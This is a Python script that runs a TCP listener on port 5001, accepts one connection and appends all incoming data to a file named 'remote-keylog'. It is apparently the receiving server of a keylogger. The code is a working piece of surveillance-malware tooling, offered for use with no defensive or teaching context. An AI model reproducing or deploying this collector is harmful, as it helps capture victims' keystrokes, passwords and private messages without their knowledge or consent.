import socket
import os

server_host = "0.0.0.0"
server_port = 5001
buffer_size = 4096
separator = "<SEPARATOR>"
filepath = "remote-keylog"

s = socket.socket()
s.bind((server_host, server_port))

s.listen(5)
print(f"[*] Listening on {server_host}:{server_port}")

client_socket, address = s.accept()
print(f"[*] Connected with {address}")

recieved = client_socket.recv(buffer_size).decode()
filename, filesize = recieved.split(separator)

print(recieved)
print(filename)
print(filesize)
filename = os.path.basename(filename)

filesize = int(filesize)

received_bytes = 0
with open(filepath, "ab") as f:
    while True:
        bytes_read = client_socket.recv(buffer_size)
        if not bytes_read:
            break
        f.write(bytes_read)
        received_bytes += len(bytes_read)
        print(bytes_read)

print(f"Wrote at {filepath}.")
client_socket.close()
s.close()